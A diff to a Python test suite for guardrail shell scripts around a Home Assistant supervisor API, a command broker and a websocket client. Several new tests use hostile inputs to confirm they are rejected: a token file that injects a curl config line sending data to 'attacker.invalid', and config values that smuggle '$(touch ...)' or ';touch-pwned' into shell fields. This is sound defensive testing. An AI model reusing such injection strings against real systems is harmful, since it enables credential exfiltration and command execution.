@@ -3,6 +3,7 @@
 
 from __future__ import annotations
 
+import asyncio
 import json
 import os
 import runpy
@@ -17,6 +18,7 @@ from pathlib import Path
 SCRIPTS_DIR = Path(__file__).resolve().parents[1]
 SUPERVISOR_API = SCRIPTS_DIR / "supervisor-api.sh"
 SUPERVISOR_BROKER = SCRIPTS_DIR / "supervisor-broker.sh"
+SUPERVISOR_PATH_UTILS = SCRIPTS_DIR / "supervisor-path-utils.sh"
 HA_GUARD = SCRIPTS_DIR / "ha-guard.sh"
 HA_WS = SCRIPTS_DIR / "ha-ws"
 
@@ -65,6 +67,7 @@ class SupervisorApiTests(TemporaryGuardrailTest):
         self.broker_capture = self.temp / "broker.json"
         self.broker_env_capture = self.temp / "broker-env.txt"
         self.curl_capture = self.temp / "curl.json"
+        self.curl_stdin_capture = self.temp / "curl-stdin.txt"
         self.token_file = self.temp / "token"
         self.token_file.write_text("test-supervisor-token\n", encoding="utf-8")
 
@@ -89,6 +92,8 @@ import os
 import sys
 with open(os.environ["CURL_CAPTURE"], "w", encoding="utf-8") as handle:
     json.dump(sys.argv[1:], handle)
+with open(os.environ["CURL_STDIN_CAPTURE"], "w", encoding="utf-8") as handle:
+    handle.write(sys.stdin.read())
 """,
         )
 
@@ -99,11 +104,13 @@ with open(os.environ["CURL_CAPTURE"], "w", encoding="utf-8") as handle:
                 'BROKER="/data/packages/guard/bin/supervisor-broker"': f'BROKER="{self.fake_broker}"',
                 'TOKEN_FILE="/data/.supervisor/token"': f'TOKEN_FILE="{self.token_file}"',
                 'CURL_BIN="/usr/bin/curl"': f'CURL_BIN="{self.bin_dir / "curl"}"',
+                'SUPERVISOR_PATH_UTILS="${SUPERVISOR_PATH_UTILS:-/opt/scripts/supervisor-path-utils.sh}"': f'SUPERVISOR_PATH_UTILS="{SUPERVISOR_PATH_UTILS}"',
             },
         )
         self.env["BROKER_CAPTURE"] = str(self.broker_capture)
         self.env["BROKER_ENV_CAPTURE"] = str(self.broker_env_capture)
         self.env["CURL_CAPTURE"] = str(self.curl_capture)
+        self.env["CURL_STDIN_CAPTURE"] = str(self.curl_stdin_capture)
 
     def test_codex_actor_marker_reaches_the_authorization_broker(self) -> None:
         self.env["CODEX_TERMINAL_AGENT_EXECUTION"] = "1"
@@ -139,7 +146,12 @@ with open(os.environ["CURL_CAPTURE"], "w", encoding="utf-8") as handle:
         self.assertIn("--noproxy", curl_args)
         self.assertEqual(curl_args[curl_args.index("--connect-timeout") + 1], "10")
         self.assertEqual(curl_args[curl_args.index("--max-time") + 1], "10")
-        self.assertIn("Authorization: Bearer test-supervisor-token", curl_args)
+        self.assertNotIn("Authorization: Bearer test-supervisor-token", curl_args)
+        self.assertNotIn("test-supervisor-token", "\0".join(curl_args))
+        self.assertEqual(
+            self.curl_stdin_capture.read_text(encoding="utf-8"),
+            'header = "Authorization: Bearer test-supervisor-token"\n',
+        )
         self.assertIn("Content-Type: application/json", curl_args)
         self.assertIn("Accept: application/json", curl_args)
         self.assertIn(payload, curl_args)
@@ -173,6 +185,19 @@ with open(os.environ["CURL_CAPTURE"], "w", encoding="utf-8") as handle:
                 self.assertIn("greater than zero", rejected.stderr)
                 self.assertFalse(self.curl_capture.exists())
                 self.assertFalse(self.broker_capture.exists())
+
+    def test_token_cannot_inject_an_option_into_the_stdin_curl_config(self) -> None:
+        self.token_file.write_text(
+            'valid-prefix"\nurl = "http://attacker.invalid/collect"\n',
+            encoding="utf-8",
+        )
+
+        completed = self.run_command([str(self.script), "/core/info"])
+
+        self.assertEqual(completed.returncode, 1)
+        self.assertIn("supervisor token file is invalid", completed.stderr)
+        self.assertFalse(self.curl_capture.exists())
+        self.assertFalse(self.curl_stdin_capture.exists())
 
     def test_caller_cannot_override_request_destination_or_curl_configuration(self) -> None:
         attacks = (
@@ -363,7 +388,9 @@ class SupervisorBrokerTests(TemporaryGuardrailTest):
         self.confirm_dir = self.temp / "confirm"
         self.audit_log = self.temp / "broker.log"
         self.conf_file.write_text(
-            'SUPERVISOR_BROKER_COMMA_DISPATCH_ENABLED="false"\n',
+            'SUPERVISOR_BROKER_COMMA_DISPATCH_ENABLED="false"\n'
+            'SUPERVISOR_BROKER_PRIMARY_TMUX_TARGET="codex-terminal:0.0"\n'
+            'SUPERVISOR_BROKER_RAW_TMUX_TARGET="codex-terminal:raw-shell.0"\n',
             encoding="utf-8",
         )
         self.script = instrument_script(
@@ -373,6 +400,7 @@ class SupervisorBrokerTests(TemporaryGuardrailTest):
                 'CONF_FILE="/data/.supervisor/broker.conf"': f'CONF_FILE="{self.conf_file}"',
                 'CONFIRM_DIR="/data/.supervisor/confirm"': f'CONFIRM_DIR="{self.confirm_dir}"',
                 'AUDIT_LOG="/data/logs/supervisor-broker.log"': f'AUDIT_LOG="{self.audit_log}"',
+                'SUPERVISOR_PATH_UTILS="${SUPERVISOR_PATH_UTILS:-/opt/scripts/supervisor-path-utils.sh}"': f'SUPERVISOR_PATH_UTILS="{SUPERVISOR_PATH_UTILS}"',
             },
         )
         write_executable(
@@ -459,6 +487,34 @@ esac
     def test_safe_get_remains_noninteractive(self) -> None:
         completed = self.run_command([str(self.script), "rest", "GET", "/core/api/states"])
         self.assertEqual(completed.returncode, 0, completed.stderr)
+
+    def test_broker_config_is_parsed_as_data_and_cannot_execute_shell(self) -> None:
+        marker = self.temp / "broker-config-executed"
+        self.conf_file.write_text(
+            'SUPERVISOR_BROKER_ENABLED="true"\n'
+            'SUPERVISOR_BROKER_PRIMARY_TMUX_TARGET="codex-terminal:0.0"\n'
+            'SUPERVISOR_BROKER_RAW_TMUX_TARGET="codex-terminal:raw-shell.0"\n'
+            f'RETIRED_KEY="$(touch {marker})"\n',
+            encoding="utf-8",
+        )
+
+        completed = self.run_command([str(self.script), "rest", "GET", "/core/api/states"])
+
+        self.assertEqual(completed.returncode, 0, completed.stderr)
+        self.assertFalse(marker.exists())
+
+    def test_invalid_trusted_tmux_target_fails_closed(self) -> None:
+        self.conf_file.write_text(
+            'SUPERVISOR_BROKER_ENABLED="true"\n'
+            'SUPERVISOR_BROKER_PRIMARY_TMUX_TARGET="codex-terminal:0.0;touch-pwned"\n'
+            'SUPERVISOR_BROKER_RAW_TMUX_TARGET="codex-terminal:raw-shell.0"\n',
+            encoding="utf-8",
+        )
+
+        completed = self.run_command([str(self.script), "rest", "GET", "/core/api/states"])
+
+        self.assertEqual(completed.returncode, 1)
+        self.assertIn("refusing invalid broker configuration", completed.stderr)
 
     def test_service_and_state_writes_require_confirmation(self) -> None:
         writes = (
@@ -763,6 +819,18 @@ class ClientSession:
         namespace = runpy.run_path(str(HA_WS))
         with self.assertRaisesRegex(RuntimeError, "reserved request key"):
             namespace["build_ws_request"]("get_states", {"type": "call_service"})
+
+    def test_whole_websocket_transaction_has_a_deadline(self) -> None:
+        namespace = runpy.run_path(str(HA_WS))
+
+        async def never_finishes(_command_type, _payload=None):
+            await asyncio.Future()
+
+        function_globals = namespace["ws_call"].__globals__
+        function_globals["_ws_call"] = never_finishes
+        function_globals["WS_CALL_TIMEOUT_SECONDS"] = 0.01
+        with self.assertRaisesRegex(RuntimeError, "exceeded"):
+            asyncio.run(namespace["ws_call"]("ping"))
 
 
 if __name__ == "__main__":
